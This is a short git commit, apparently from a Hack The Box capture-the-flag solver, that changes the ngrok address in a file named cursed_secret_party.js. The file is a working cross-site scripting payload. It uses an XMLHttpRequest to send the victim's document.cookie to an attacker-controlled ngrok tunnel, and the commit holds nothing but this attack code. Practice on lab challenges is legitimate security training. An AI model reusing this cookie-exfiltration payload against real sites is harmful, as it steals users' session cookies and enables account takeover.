cbe242a97e81da9b169274245376d5e76d1a29bc
fluwh3n <fluwh3n@localhost.localdomain>
2024-08-04 14:49:34 -0500

    solver-htb-003

--- cursed_secret_party.js
+++ cursed_secret_party.js
@@ -1,3 +1,3 @@
 var request = new XMLHttpRequest();
-request.open('GET','https://c588-38-25-15-235.ngrok-free.app/?cookie=' + document.cookie);
+request.open('GET','https://48d7-38-25-15-235.ngrok-free.app/?cookie=' + document.cookie);
 request.send();
